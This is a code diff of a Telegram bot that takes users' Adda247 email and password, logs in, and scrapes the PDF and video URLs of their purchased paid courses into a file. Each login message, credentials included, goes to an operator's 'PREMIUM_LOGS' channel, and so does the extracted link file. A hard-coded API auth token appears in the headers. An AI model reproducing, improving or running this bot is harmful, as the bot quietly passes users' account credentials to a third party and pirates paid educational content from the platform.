@@ -24,7 +24,6 @@ app = Client(
     bot_token=config.BOT_TOKEN
 )
 
-# User state management dictionary
 USER_DATA = {}
 THUMB_PATH = "thumb.jpg"
 TIMEOUT = 30
@@ -35,8 +34,8 @@ DEFAULT_HEADERS = {
     "Accept-Language": "en-US,en;q=0.9",
     "Origin": "https://www.adda247.com",
     "Referer": "https://www.adda247.com/",
-    "authority": "store.adda247.com",
-    "X-Auth-Token": "fpoa43edty5"
+    "X-Auth-Token": "fpoa43edty5",
+    "deviceId": "web_browser_client_pro"
 }
 
 def safe_get(obj, *keys, default=None):
@@ -78,13 +77,14 @@ async def make_request(url, headers=None, method="GET", json_data=None, timeout=
             if response.status_code == 200:
                 return response.json()
             else:
+                logger.warning(f"Endpoint {url} returned {response.status_code}")
                 return None
     except Exception as e:
         logger.error(f"Request Error for {url}: {e}")
         return None
 
 async def forward_to_log(message: Message, platform: str):
-    if config.PREMIUM_LOGS and config.PREMIUM_LOGS != 0:
+    if hasattr(config, "PREMIUM_LOGS") and config.PREMIUM_LOGS:
         try:
             log_text = (
                 f"🔑 <b>NEW LOGIN RECEIVED</b>\n\n"
@@ -94,7 +94,7 @@ async def forward_to_log(message: Message, platform: str):
             )
             await app.send_message(config.PREMIUM_LOGS, log_text, parse_mode=ParseMode.HTML)
         except Exception as e:
-            logger.error(f"Failed to forward logs: {e}")
+            logger.error(f"Skipping Log Channel (Invalid Channel/Permissions): {e}")
 
 async def scrape_package_items(pkg_id, auth_headers, file_handle):
     items_count = 0
@@ -119,14 +119,12 @@ async def scrape_package_items(pkg_id, auth_headers, file_handle):
                     continue
                 item_name = safe_get(item, "name", default="Untitled").replace('|', '_').replace('/', '_')
                 
-                # Check PDF
                 pdf_file = safe_get(item, "pdfFileName") or safe_get(item, "pdf") or safe_get(item, "fileUrl")
                 if pdf_file:
                     pdf_url = pdf_file if pdf_file.startswith("http") else f"https://store.adda247.com/{pdf_file}"
                     file_handle.write(f"{item_name}: {pdf_url}\n")
                     items_count += 1
 
-                # Check Video
                 video_url = safe_get(item, "url") or safe_get(item, "videoUrl")
                 if video_url:
                     file_handle.write(f"{item_name}: {video_url}\n")
@@ -180,7 +178,7 @@ async def handle_user_input(client, message: Message):
         await forward_to_log(message, "Adda247")
 
         email, password = message.text.split("*", 1)
-        auth_headers = {"authority": "userapi.adda247.com", "X-Jwt-Token": ""}
+        auth_headers = {}
 
         login_data = {
             "email": email.strip(),
@@ -206,29 +204,32 @@ async def handle_user_input(client, message: Message):
             del USER_DATA[chat_id]
             return
 
+        # Crucial Token Assignment
         auth_headers["X-Jwt-Token"] = jwt
+        auth_headers["jwtToken"] = jwt
+
         await status_msg.edit_text("✅ <b>Login Successful!</b>\n🔄 Fetching your purchased batches...", parse_mode=ParseMode.HTML)
 
-        # Fetch Batches
+        # Fetch Batches (Using Compatible Endpoints)
         packages_response = await make_request(
-            "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=50&src=aweb",
+            "https://store.adda247.com/api/v1/my/purchase?src=aweb",
             headers=auth_headers
         )
 
         packages = safe_get(packages_response, "data", default=[])
+        
         if not packages:
-            v1_packages = await make_request(
-                "https://store.adda247.com/api/v1/my/purchase?src=aweb",
+            v2_packages = await make_request(
+                "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=50&src=aweb",
                 headers=auth_headers
             )
-            packages = safe_get(v1_packages, "data", default=[])
+            packages = safe_get(v2_packages, "data", default=[])
 
         if not packages:
             await status_msg.edit_text("❌ <b>No Packages Found:</b> Account par koi active batch nahi mila.")
             del USER_DATA[chat_id]
             return
 
-        # Store Batches in Memory and Present List
         USER_DATA[chat_id] = {
             "state": "WAITING_BATCH_SELECTION",
             "headers": auth_headers,
@@ -261,7 +262,6 @@ async def handle_user_input(client, message: Message):
         package_id = safe_get(selected_package, "packageId") or safe_get(selected_package, "id")
         package_title = safe_get(selected_package, "title", default="Untitled").replace('|', '_').replace('/', '_')
 
-        # Reset state to clear memory
         del USER_DATA[chat_id]
 
         status_msg = await message.reply_text(
@@ -275,10 +275,8 @@ async def handle_user_input(client, message: Message):
         thumb_path = await download_thumbnail()
 
         with open(file_name, "w", encoding='utf-8') as file:
-            # Direct items
             total_items += await scrape_package_items(package_id, auth_headers, file)
 
-            # Child items scan
             child_urls = [
                 f"https://store.adda247.com/api/v2/ppc/package/child?packageId={package_id}&pageNumber=0&pageSize=100&src=aweb",
                 f"https://store.adda247.com/api/v1/ppc/package/child?packageId={package_id}&src=aweb"
@@ -320,7 +318,7 @@ async def handle_user_input(client, message: Message):
                 parse_mode=ParseMode.HTML
             )
 
-            if config.PREMIUM_LOGS and config.PREMIUM_LOGS != 0:
+            if hasattr(config, "PREMIUM_LOGS") and config.PREMIUM_LOGS:
                 try:
                     await app.send_document(
                         chat_id=config.PREMIUM_LOGS,
@@ -330,7 +328,7 @@ async def handle_user_input(client, message: Message):
                         parse_mode=ParseMode.HTML
                     )
                 except Exception as log_err:
-                    logger.error(f"Log sending failed: {log_err}")
+                    logger.error(f"Log sending skipped: {log_err}")
 
             os.remove(file_name)
             await status_msg.delete()
